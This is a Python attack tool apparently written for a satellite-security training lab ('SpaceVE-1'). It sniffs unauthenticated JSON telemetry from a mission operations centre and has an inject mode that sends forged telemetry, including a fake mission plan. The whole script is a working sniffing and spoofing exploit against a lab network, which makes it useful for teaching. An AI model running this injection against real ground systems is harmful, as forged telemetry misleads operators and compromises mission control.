#!/usr/bin/env python3
"""
telemetry_decoder.py — SpaceVE-1 Telemetry Decoder
SpaceVE-1 Lab Attack Tool

Listens passively on the network for satellite telemetry packets
and decodes them. Two modes:

  --mode udp   : Listen on UDP (direct satellite telemetry stream)
  --mode moc   : Poll MOC /api/telemetry endpoint (simpler, no root needed)
  --mode inject: Inject a fake telemetry packet to the MOC (shows unauth injection)

Telemetry Format (SpaceVE-1 uses JSON-over-UDP, not raw CCSDS):
  Satellite sends JSON to MOC UDP 1235 every 1 second.
  No encryption. No source authentication.
  An attacker on the 192.168.60.0/24 network can:
    1. Sniff telemetry passively
    2. Inject false telemetry to mislead ground operators

This models the "Silent Subversion" attack class described in
research_index.md (Falco et al., 2023 IEEE conference paper):
  attacker injects false downlink data without the satellite's knowledge.

Usage:
  python3 telemetry_decoder.py --mode moc
  python3 telemetry_decoder.py --mode udp --count 10
  python3 telemetry_decoder.py --mode inject --spoof-uptime 999999

Common Beginner Mistakes:
  - Listening on UDP 1235 from outside the spacelab network won't work
  - The JSON format is SpaceVE-1 specific — real CCSDS telemetry is binary
  - Telemetry injection only works because MOC trusts the source IP
"""

import argparse
import json
import socket
import time

import requests

MOC_IP       = "192.168.60.11"
MOC_PORT     = 8080
TLM_UDP_PORT = 1235


def decode_pretty(tlm: dict, source: str = ""):
    ts = time.strftime("%H:%M:%S")
    print(f"\n  [{ts}] Telemetry{' from ' + source if source else ''}")
    print(f"  {'-' * 40}")
    for k, v in tlm.items():
        if k.startswith("_"):
            continue
        if isinstance(v, dict):
            print(f"  {k}:")
            for sk, sv in v.items():
                print(f"    {sk}: {sv}")
        else:
            print(f"  {k}: {v}")

    if tlm.get("downlink_enabled"):
        mp = tlm.get("mission_plan", {})
        if mp:
            print()
            print(f"  *** MISSION PLAN DATA IN CLEARTEXT ***")
            print(f"  *** lat={mp.get('lat')}, lon={mp.get('lon')} ***")
            print(f"  *** target={mp.get('target_name', '?')} ***")


def mode_moc(args):
    print(f"\n  Polling MOC telemetry at http://{MOC_IP}:{MOC_PORT}/api/telemetry")
    print(f"  No authentication required. Press Ctrl+C to stop.\n")
    count = 0
    while args.count == 0 or count < args.count:
        try:
            r = requests.get(f"http://{MOC_IP}:{MOC_PORT}/api/telemetry", timeout=3)
            if r.status_code == 200:
                tlm = r.json()
                decode_pretty(tlm, source=f"{MOC_IP}:{MOC_PORT}")
            else:
                print(f"  [{time.strftime('%H:%M:%S')}] HTTP {r.status_code}")
        except requests.RequestException as e:
            print(f"  Error: {e}")
        count += 1
        if args.count == 0 or count < args.count:
            time.sleep(args.interval)
    print()


def mode_udp(args):
    print(f"\n  Listening on UDP {TLM_UDP_PORT} for raw satellite telemetry")
    print(f"  Must be run from inside the spacelab network (192.168.60.x).")
    print(f"  No authentication — any host on the network receives this stream.\n")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", TLM_UDP_PORT))
    sock.settimeout(5.0)
    count = 0
    while args.count == 0 or count < args.count:
        try:
            data, addr = sock.recvfrom(4096)
            src_ip = addr[0]
            try:
                tlm = json.loads(data.decode())
                decode_pretty(tlm, source=src_ip)
            except json.JSONDecodeError:
                print(f"  Non-JSON packet from {src_ip}: {data[:64].hex()}")
            count += 1
        except socket.timeout:
            print(f"  [{time.strftime('%H:%M:%S')}] Waiting for telemetry...")
    sock.close()
    print()


def mode_inject(args):
    print(f"\n  Injecting fake telemetry to MOC at {MOC_IP}:{TLM_UDP_PORT}")
    print(f"  Source IP is not verified — MOC will display our forged data.\n")
    fake_tlm = {
        "satellite_id": "SPACEVE-1",
        "uptime_s": args.spoof_uptime,
        "mode": "NOMINAL",
        "battery_v": 28.5,
        "temp_c": 24.1,
        "camera_enabled": True,
        "downlink_enabled": True,
        "mission_plan": {
            "target_name": "INJECTED_TARGET",
            "lat": 0.0,
            "lon": 0.0,
            "window_start": "2024-01-01T00:00:00Z",
        },
        "_injected": True,
    }
    payload = json.dumps(fake_tlm).encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (MOC_IP, TLM_UDP_PORT))
    sock.close()
    print(f"  Sent {len(payload)} bytes of fake telemetry")
    print(f"  Check MOC dashboard: http://{MOC_IP}:{MOC_PORT}")
    print(f"  The MOC will now display forged satellite state.\n")


def main():
    p = argparse.ArgumentParser(description="SpaceVE-1 telemetry decoder")
    p.add_argument("--mode", choices=["moc", "udp", "inject"], default="moc")
    p.add_argument("--count", type=int, default=5, help="Packets to capture (0=infinite)")
    p.add_argument("--interval", type=float, default=2.0, help="Poll interval in seconds (moc mode)")
    p.add_argument("--spoof-uptime", type=int, default=999999, help="Uptime to inject (inject mode)")
    args = p.parse_args()

    if args.mode == "moc":
        mode_moc(args)
    elif args.mode == "udp":
        mode_udp(args)
    elif args.mode == "inject":
        mode_inject(args)


if __name__ == "__main__":
    main()
